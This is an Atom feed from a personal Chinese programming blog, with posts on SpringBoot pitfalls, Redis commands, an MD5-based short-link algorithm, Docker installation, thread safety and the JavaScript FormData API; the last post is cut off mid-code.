<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Aunsetre&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://aunsetre.top/"/>
  <updated>2018-07-02T04:55:00.634Z</updated>
  <id>https://aunsetre.top/</id>
  
  <author>
    <name>Aunsetre</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SpringBoot所遇到的坑</title>
    <link href="https://aunsetre.top/2018/07/02/SpringBoot%E6%89%80%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/"/>
    <id>https://aunsetre.top/2018/07/02/SpringBoot所遇到的坑/</id>
    <published>2018-07-02T04:47:52.523Z</published>
    <updated>2018-07-02T04:55:00.634Z</updated>
    
    <content type="html"><![CDATA[<h4 id="整合Mybatis出现A-component-required-a-bean-of-type-‘com-aunsetre-mapping-UserMapper’-that-could-not-be-found"><a href="#整合Mybatis出现A-component-required-a-bean-of-type-‘com-aunsetre-mapping-UserMapper’-that-could-not-be-found" class="headerlink" title="整合Mybatis出现A component required a bean of type ‘com.aunsetre.mapping.UserMapper’ that could not be found."></a>整合Mybatis出现A component required a bean of type ‘com.aunsetre.mapping.UserMapper’ that could not be found.</h4><p>SpringBoot没有找到注入的Mapper,在Main方法上加@MapperScan(“Mapper接口包名”)<a id="more"></a></p><h4 id="页面访问controller报404错误"><a href="#页面访问controller报404错误" class="headerlink" title="页面访问controller报404错误"></a>页面访问controller报404错误</h4><p>spring没有扫描到controller层，因为springboot扫描规则是从启动类所在包开始扫描，扫描该类所在包以及子</p><p>包，如果controller层所在的包不在启动类包内，spring是无法去扫描的。</p><p>因此，最好将启动类放在最外层</p><h4 id="读取properties文件中的中文乱码"><a href="#读取properties文件中的中文乱码" class="headerlink" title="读取properties文件中的中文乱码"></a>读取properties文件中的中文乱码</h4><p>通过如下的方法 注：勾上之后，最好把文件先备份后删掉，再新建一次。建议把IDEA的编码格式都配置成UTF-8 </p><h4 id="读取数据库中的中文乱码"><a href="#读取数据库中的中文乱码" class="headerlink" title="读取数据库中的中文乱码"></a>读取数据库中的中文乱码</h4><p>检查数据库的字符集编码格式，改成utf8  检查数据连接的url加入<code>characterEncoding=urf8</code>  <code>jdbc:mysql://127.0.0.1:3306/test?characterEncoding=utf8</code> </p><h4 id="返回到前端的数据乱码"><a href="#返回到前端的数据乱码" class="headerlink" title="返回到前端的数据乱码"></a>返回到前端的数据乱码</h4><p>在配置文件中添加<code>spring.http.encoding.force=true</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;整合Mybatis出现A-component-required-a-bean-of-type-‘com-aunsetre-mapping-UserMapper’-that-could-not-be-found&quot;&gt;&lt;a href=&quot;#整合Mybatis出现A-component-required-a-bean-of-type-‘com-aunsetre-mapping-UserMapper’-that-could-not-be-found&quot; class=&quot;headerlink&quot; title=&quot;整合Mybatis出现A component required a bean of type ‘com.aunsetre.mapping.UserMapper’ that could not be found.&quot;&gt;&lt;/a&gt;整合Mybatis出现A component required a bean of type ‘com.aunsetre.mapping.UserMapper’ that could not be found.&lt;/h4&gt;&lt;p&gt;SpringBoot没有找到注入的Mapper,在Main方法上加@MapperScan(“Mapper接口包名”)
    
    </summary>
    
      <category term="Java" scheme="https://aunsetre.top/categories/Java/"/>
    
    
      <category term="SpringBoot" scheme="https://aunsetre.top/tags/SpringBoot/"/>
    
  </entry>
  
  <entry>
    <title>Redis笔记（一）</title>
    <link href="https://aunsetre.top/2018/06/06/Redis%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://aunsetre.top/2018/06/06/Redis笔记（一）/</id>
    <published>2018-06-06T06:37:33.308Z</published>
    <updated>2018-06-06T06:39:41.563Z</updated>
    
    <content type="html"><![CDATA[<p><strong>启动Redis服务器</strong></p><p><code>$ src/redis-server</code></p><p><img src="https://static.aunsetre.top/hexo/img/2018/06/1528262244802.png" alt="1528262244802"></p><p>默认并不是在后台启动，如果你想在后台启动则需要开启守护进程<a id="more"></a></p><p>修改Redis.conf中的daemonize 设置为yes(默认是no)</p><p>再重新启动,依据配置文件启动服务器</p><p><code>src/redis-server url/redis.conf</code></p><h2 id="关闭进程"><a href="#关闭进程" class="headerlink" title="关闭进程"></a>关闭进程</h2><p><strong>查看Redis进程，拿到pid</strong></p><p><code>ps -ef |grep redis</code></p><p><strong>关闭进程</strong></p><p><code>kill pid</code></p><p><strong>对于结束不掉的进程可以使用：</strong></p><p><code>kill -s 9 pid</code></p><h3 id="Redis-键命令"><a href="#Redis-键命令" class="headerlink" title="Redis 键命令"></a>Redis 键命令</h3><p><strong>设置键值</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis 127.0.0.1:6379&gt; SET name redis</span><br><span class="line">OK</span><br></pre></td></tr></table></figure></p><p><strong>根据键取值</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; get name</span><br><span class="line">&quot;redis&quot;</span><br></pre></td></tr></table></figure></p><p><strong>修改Key的名称</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># RENAME key newkey</span><br></pre></td></tr></table></figure><p><strong>删除Key</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis 127.0.0.1:6379&gt; DEL runoobkey</span><br><span class="line">(integer) 1</span><br></pre></td></tr></table></figure><p><strong>检查Key是否存在，存在返回1，不存在返回0</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXISTS key</span><br></pre></td></tr></table></figure><p><strong>为给定 key 设置过期时间</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXPIRE key seconds</span><br></pre></td></tr></table></figure><p><strong>EXPIREAT 的作用和 EXPIRE 类似，都用于为 key 设置过期时间。 不同在于 EXPIREAT 命令接受的时间参数是  时间戳</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXPIREAT key timestamp</span><br></pre></td></tr></table></figure></p><p><strong>设置 key 的过期时间以毫秒计。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PEXPIRE key milliseconds</span><br></pre></td></tr></table></figure><p><strong>移除Key的过期时间</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PERSIST key</span><br></pre></td></tr></table></figure><p><strong>TYPE key 返回 key 所储存的值的类型 </strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TYPE key</span><br></pre></td></tr></table></figure><p> <strong>随机返回一个Key</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RANDOMKEY</span><br></pre></td></tr></table></figure><p><strong>根据给定pattern筛选key </strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KEYS pattern</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;启动Redis服务器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ src/redis-server&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://static.aunsetre.top/hexo/img/2018/06/1528262244802.png&quot; alt=&quot;1528262244802&quot;&gt;&lt;/p&gt;
&lt;p&gt;默认并不是在后台启动，如果你想在后台启动则需要开启守护进程
    
    </summary>
    
      <category term="Redis" scheme="https://aunsetre.top/categories/Redis/"/>
    
    
  </entry>
  
  <entry>
    <title>短链生成算法</title>
    <link href="https://aunsetre.top/2018/05/22/%E7%9F%AD%E9%93%BE%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95/"/>
    <id>https://aunsetre.top/2018/05/22/短链生成算法/</id>
    <published>2018-05-22T12:33:28.703Z</published>
    <updated>2018-05-23T04:26:55.819Z</updated>
    
    <content type="html"><![CDATA[<h3 id="何为短链"><a href="#何为短链" class="headerlink" title="何为短链"></a>何为短链</h3><p>短链：即一个较短的链接地址，这个链接地址通常指的是url。<br><a id="more"></a></p><h3 id="为什么需要短链"><a href="#为什么需要短链" class="headerlink" title="为什么需要短链"></a>为什么需要短链</h3><p>现而今，互联网无处不在。我们无时无刻都在上网，查看信息，分享信息。而分享信息很多时候都是通过分享链接来实现的，比如说说、日志、群聊等等。一个奇长无比链接分享出来，特别恶心人。以及微博等社交软件发表、分享通常有字数限制。此时，短链需求应运而生。</p><h3 id="短链接的好处"><a href="#短链接的好处" class="headerlink" title="短链接的好处"></a>短链接的好处</h3><p>1、内容需要；2、用户友好；3、便于管理。</p><p> 为什么要这样做的，原因我想有这样几点：</p><p>微博限制字数为140字一条，那么如果我们需要发一些连接上去，但是这个连接非常的长，以至于将近要占用我们内容的一半篇幅，这肯定是不能被允许的，所以短网址应运而生了。<br>短网址可以在我们项目里可以很好的对开放级URL进行管理。有一部分网址可以会涵盖暴力，广告等信息，这样我们可以通过用户的举报，完全管理这个连接将不出现在我们的应用中，应为同样的URL通过加密算法之后，得到的地址是一样的。<br>我们可以对一系列的网址进行流量，点击等统计，挖掘出大多数用户的关注点，这样有利于我们对项目的后续工作更好的作出决策。</p><h3 id="短链原理"><a href="#短链原理" class="headerlink" title="短链原理"></a>短链原理</h3><p>将一个url部分冗长的信息通过哈希算法进行压缩，并建立哈希值与原链之间的映射。每当通过短链访问时，后端服务就通过短链中的哈希值找到对应的原链，然后通过请求转发或者重定向的方式转至原链接内容。</p><h3 id="短链算法"><a href="#短链算法" class="headerlink" title="短链算法"></a>短链算法</h3><p>基于以上原理可知，任何一种哈希算法都可以作为短链生成的算法基础，这里给大家看到的是市面上广泛采用的基于MD5的算法。</p><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> md5  = <span class="built_in">require</span>(<span class="string">'./md5'</span>).md5;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getLinkShort</span>(<span class="params">base,url</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> key = <span class="string">'alexis'</span>;</span><br><span class="line"><span class="keyword">var</span> urlhash = md5(key,url);</span><br><span class="line"><span class="keyword">var</span> len = urlhash.length;</span><br><span class="line"><span class="keyword">var</span> charset = <span class="string">'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span>;</span><br><span class="line"><span class="keyword">var</span> shortUrlList = [];</span><br><span class="line"></span><br><span class="line"><span class="comment">//将加密后的串分成4段，每段4字节，对每段进行计算，一共可以生成四组短连接</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> urlhashPiece = urlhash.substr(i * len / <span class="number">4</span>, len / <span class="number">4</span>);</span><br><span class="line">    <span class="comment">//将分段的位与0x3fffffff做位与，0x3fffffff表示二进制数的30个1，即30位以后的加密串都归零</span></span><br><span class="line">    <span class="keyword">var</span> hex = <span class="built_in">parseInt</span>(urlhashPiece,<span class="number">16</span>) &amp; <span class="number">0x3fffffff</span>; <span class="comment">//此处需要用到hexdec()将16进制字符串转为10进制数值型，否则运算会不正常</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> shortUrl = base;</span><br><span class="line">    <span class="comment">//生成6位短连接</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; j++) &#123;</span><br><span class="line">        <span class="comment">//将得到的值与0x0000003d,3d为61，即charset的坐标最大值</span></span><br><span class="line">        shortUrl += charset.charAt(hex &amp; <span class="number">0x0000003d</span>);</span><br><span class="line">        <span class="comment">//循环完以后将hex右移5位</span></span><br><span class="line">        hex = hex &gt;&gt; <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    shortUrlList.push(shortUrl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> shortUrlList;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(getLinkShort(<span class="string">'http://t.cn/'</span>,<span class="string">'http://www.baidu.com'</span>));</span><br></pre></td></tr></table></figure><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[ <span class="string">'http://t.cn/vDS0KK'</span>,</span><br><span class="line">  <span class="string">'http://t.cn/vvDCO4'</span>,</span><br><span class="line">  <span class="string">'http://t.cn/b984CK'</span>,</span><br><span class="line">  <span class="string">'http://t.cn/ebfzHS'</span> ]</span><br></pre></td></tr></table></figure><p>可以看到上面的方法生成了四个短链，可根据需要，采取其中一个作为短链即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;何为短链&quot;&gt;&lt;a href=&quot;#何为短链&quot; class=&quot;headerlink&quot; title=&quot;何为短链&quot;&gt;&lt;/a&gt;何为短链&lt;/h3&gt;&lt;p&gt;短链：即一个较短的链接地址，这个链接地址通常指的是url。&lt;br&gt;
    
    </summary>
    
      <category term="JavaScript" scheme="https://aunsetre.top/categories/JavaScript/"/>
    
    
      <category term="JavaScript" scheme="https://aunsetre.top/tags/JavaScript/"/>
    
      <category term="算法" scheme="https://aunsetre.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>安装Docker</title>
    <link href="https://aunsetre.top/2018/05/22/2018-1-15-%E5%AE%89%E8%A3%85Docker/"/>
    <id>https://aunsetre.top/2018/05/22/2018-1-15-安装Docker/</id>
    <published>2018-05-22T12:33:28.653Z</published>
    <updated>2018-06-09T10:39:04.654Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>● 操作系统 CentOS 7.2 64位<br>● CPU 1核<br>● 内存 1GB</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install docker-io</span><br></pre></td></tr></table></figure><h2 id="启动docker"><a href="#启动docker" class="headerlink" title="启动docker"></a>启动docker</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="加入开机启动"><a href="#加入开机启动" class="headerlink" title="加入开机启动"></a>加入开机启动</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig docker on</span><br></pre></td></tr></table></figure><h2 id="从docker-io中下载centos镜像到本地-var-lib-docker-graph"><a href="#从docker-io中下载centos镜像到本地-var-lib-docker-graph" class="headerlink" title="从docker.io中下载centos镜像到本地 /var/lib/docker/graph"></a>从docker.io中下载centos镜像到本地 /var/lib/docker/graph</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull centos:latest</span><br></pre></td></tr></table></figure><h2 id="查看已下载的镜像"><a href="#查看已下载的镜像" class="headerlink" title="查看已下载的镜像"></a>查看已下载的镜像</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><h2 id="启动一个容器"><a href="#启动一个容器" class="headerlink" title="启动一个容器"></a>启动一个容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -i -t centos /bin/bash</span><br></pre></td></tr></table></figure><h2 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h2><p>ctrl+d 退出容器且关闭, docker ps 查看无<br>ctrl+p+q 退出容器但不关闭, docker ps 查看有</p><h2 id="查看所有容器"><a href="#查看所有容器" class="headerlink" title="查看所有容器"></a>查看所有容器</h2><p>docker ps</p><p><img src="http://static.aunsetre.top/hexo/img/docker2.png" alt="img"></p><h2 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker attach 44fc0f0582d9</span><br></pre></td></tr></table></figure><p><img src="https://static.aunsetre.top/hexo/img/docker1.png" alt="img"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;p&gt;● 操作系统 CentOS 7.2 64位&lt;br&gt;● CPU 1核&lt;br&gt;● 内存 1GB&lt;/p&gt;
&lt;h2 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;yum -y install docker-io&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;启动docker&quot;&gt;&lt;a href=&quot;#启动docker&quot; class=&quot;headerlink&quot; title=&quot;启动docker&quot;&gt;&lt;/a&gt;启动docker&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;service docker start&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Docker" scheme="https://aunsetre.top/categories/Docker/"/>
    
    
  </entry>
  
  <entry>
    <title>线程安全问题分析</title>
    <link href="https://aunsetre.top/2018/05/15/%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/"/>
    <id>https://aunsetre.top/2018/05/15/线程安全问题分析/</id>
    <published>2018-05-14T16:00:00.000Z</published>
    <updated>2018-05-29T05:10:26.322Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是线程安全问题？"><a href="#什么是线程安全问题？" class="headerlink" title="什么是线程安全问题？"></a>什么是线程安全问题？</h2><p>从某个线程开始访问到访问结束的整个过程，如果有一个访问对象被其他线程修改，那么对于当前线程而言就发生了线程安全问题；如果在整个访问过程中，无一对象被其他线程修改，就是线程安全的。</p><h2 id="线程安全问题产生的根本原因"><a href="#线程安全问题产生的根本原因" class="headerlink" title="线程安全问题产生的根本原因"></a>线程安全问题产生的根本原因</h2><ol><li>首先是多线程环境，即同时存在有多个操作者，单线程环境不存在线程安全问题。在单线程环境下，任何操作包括修改操作都是操作者自己发出的，操作者发出操作时不仅有明确的目的，而且意识到操作的影响。</li><li>多个操作者（线程）必须操作同一个对象，只有多个操作者同时操作一个对象，行为的影响才能立即传递到其他操作者。</li><li>多个操作者（线程）对同一对象的操作必须包含修改操作，共同读取不存在线程安全问题，因为对象不被修改，未发生变化，不能产生影响。</li></ol><p>综上可知，线程安全问题产生的根本原因是共享数据存在被并发修改的可能，即一个线程读取时，允许另一个线程修改。<a id="more"></a></p><h2 id="线程安全问题解决思路"><a href="#线程安全问题解决思路" class="headerlink" title="线程安全问题解决思路"></a>线程安全问题解决思路</h2><p>根据线程安全问题产生的条件，解决线程安全问题的思路是消除产生线程安全问题的环境：</p><ol><li>消除共享数据：成员变量与静态变量多线程共享，将这些全局变量转化为局部变量，局部变量存放在栈，线程间不共享，就不存在线程安全问题产生的环境了。消除共享数据的不足：如果需要一个对象采集各个线程的信息，或者在线程间传递信息，消除了共享对象就无法实现此目的。</li><li>使用线程同步机制：给读写操作同时加锁，使得同时只有一个线程可以访问共享数据。如果单单给写操作加锁，同时只有一个线程可以执行写操作，而读操作不受限制，允许多线程并发读取，这时就可能出现不可重复读的情况，如一个持续时间比较长的读线程，相隔较长时间读取数组同一索引位置的数据，正好在这两次读取的时间内，一个线程修改了该索引处的数据，造成该线程从同一索引处前后读取的数据不一致。是同时给读写加锁，还是只给写加锁，根据具体需求而定。同步机制的缺点是降低了程序的吞吐量。</li><li>建立副本：使用ThreadLocal为每一个线程建立一个变量的副本，各个线程间独立操作，互不影响。该方式本质上是消除共享数据思想的一种实现。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;什么是线程安全问题？&quot;&gt;&lt;a href=&quot;#什么是线程安全问题？&quot; class=&quot;headerlink&quot; title=&quot;什么是线程安全问题？&quot;&gt;&lt;/a&gt;什么是线程安全问题？&lt;/h2&gt;&lt;p&gt;从某个线程开始访问到访问结束的整个过程，如果有一个访问对象被其他线程修改，那么对于当前线程而言就发生了线程安全问题；如果在整个访问过程中，无一对象被其他线程修改，就是线程安全的。&lt;/p&gt;
&lt;h2 id=&quot;线程安全问题产生的根本原因&quot;&gt;&lt;a href=&quot;#线程安全问题产生的根本原因&quot; class=&quot;headerlink&quot; title=&quot;线程安全问题产生的根本原因&quot;&gt;&lt;/a&gt;线程安全问题产生的根本原因&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;首先是多线程环境，即同时存在有多个操作者，单线程环境不存在线程安全问题。在单线程环境下，任何操作包括修改操作都是操作者自己发出的，操作者发出操作时不仅有明确的目的，而且意识到操作的影响。&lt;/li&gt;
&lt;li&gt;多个操作者（线程）必须操作同一个对象，只有多个操作者同时操作一个对象，行为的影响才能立即传递到其他操作者。&lt;/li&gt;
&lt;li&gt;多个操作者（线程）对同一对象的操作必须包含修改操作，共同读取不存在线程安全问题，因为对象不被修改，未发生变化，不能产生影响。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;综上可知，线程安全问题产生的根本原因是共享数据存在被并发修改的可能，即一个线程读取时，允许另一个线程修改。
    
    </summary>
    
    
      <category term="多线程" scheme="https://aunsetre.top/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>FormData 对象的使用</title>
    <link href="https://aunsetre.top/2018/05/10/FormData%20%E5%AF%B9%E8%B1%A1%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>https://aunsetre.top/2018/05/10/FormData 对象的使用/</id>
    <published>2018-05-09T16:00:00.000Z</published>
    <updated>2018-05-24T06:37:15.188Z</updated>
    
    <content type="html"><![CDATA[<p>通过FormData对象可以组装一组用 XMLHttpRequest发送请求的键/值对。<a id="more"></a>它可以更灵活方便的发送表单数据，因为可以独立于表单使用。如果你把表单的编码类型设置为multipart/form-data ，则通过FormData传输的数据格式和表单通过submit() 方法传输的数据格式相同</p><h2 id="如何创建一个FormData对象"><a href="#如何创建一个FormData对象" class="headerlink" title="如何创建一个FormData对象"></a>如何创建一个FormData对象</h2><p>你可以自己创建一个FormData对象，然后通过调用它的append()方法添加字段，就像这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> formData = <span class="keyword">new</span> FormData();</span><br><span class="line"></span><br><span class="line">formData.append(<span class="string">"username"</span>, <span class="string">"Groucho"</span>);</span><br><span class="line">formData.append(<span class="string">"accountnum"</span>, <span class="number">123456</span>); <span class="comment">// 数字 123456 会被立即转换成字符串 "123456"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// HTML 文件类型input，由用户选择</span></span><br><span class="line">formData.append(<span class="string">"userfile"</span>, fileInputElement.files[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// JavaScript file-like 对象</span></span><br><span class="line"><span class="keyword">var</span> content = <span class="string">'&lt;a id="a"&gt;&lt;b id="b"&gt;hey!&lt;/b&gt;&lt;/a&gt;'</span>; <span class="comment">// 新文件的正文...</span></span><br><span class="line"><span class="keyword">var</span> blob = <span class="keyword">new</span> Blob([content], &#123; <span class="attr">type</span>: <span class="string">"text/xml"</span>&#125;);</span><br><span class="line"></span><br><span class="line">formData.append(<span class="string">"webmasterfile"</span>, blob);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> request = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">request.open(<span class="string">"POST"</span>, <span class="string">"http://foo.com/submitform.php"</span>);</span><br><span class="line">request.send(formData);</span><br></pre></td></tr></table></figure><p><font color="red">注意</font>：字段 “userfile” 和 “webmasterfile”  都包含一个文件. 字段 “accountnum” 是数字类型，它将被FormData.append()方法转换成字符串类型(FormData 对象的字段类型可以是 Blob, File, 或者 string: 如果它的字段类型不是Blob也不是File，则会被转换成字符串类型。</p><p>上面的示例创建了一个FormData实例，包含”username”, “accountnum”, “userfile” 和 “webmasterfile”四个字段，然后使用XMLHttpRequest的send()方法发送表单数据。字段 “webmasterfile” 是 Blob类型。一个 Blob对象表示一个不可变的, 原始数据的类似文件对象。Blob表示的数据不一定是一个JavaScript原生格式。 File 接口基于Blob，继承 blob功能并将其扩展为支持用户系统上的文件。你可以通过 Blob() 构造函数创建一个Blob对象。</p><h2 id="通过HTML表单创建FormData对象"><a href="#通过HTML表单创建FormData对象" class="headerlink" title="通过HTML表单创建FormData对象"></a>通过HTML表单创建FormData对象</h2><p>想要构造一个包含Form表单数据的FormData对象，需要在创建FormData对象时指定表单的元素。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> formData = <span class="keyword">new</span> FormData(someFormElement);</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> formElement = <span class="built_in">document</span>.querySelector(<span class="string">"form"</span>);</span><br><span class="line"><span class="keyword">var</span> request = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">request.open(<span class="string">"POST"</span>, <span class="string">"submitform.php"</span>);</span><br><span class="line">request.send(<span class="keyword">new</span> FormData(formElement));</span><br></pre></td></tr></table></figure><p>你还可以在创建一个包含Form表单数据的FormData对象之后和发送请求之前，附加额外的数据到FormData对象里，像这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> formElement = <span class="built_in">document</span>.querySelector(<span class="string">"form"</span>);</span><br><span class="line"><span class="keyword">var</span> formData = <span class="keyword">new</span> FormData(formElement);</span><br><span class="line"><span class="keyword">var</span> request = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">request.open(<span class="string">"POST"</span>, <span class="string">"submitform.php"</span>);</span><br><span class="line">formData.append(<span class="string">"serialnumber"</span>, serialNumber++);</span><br><span 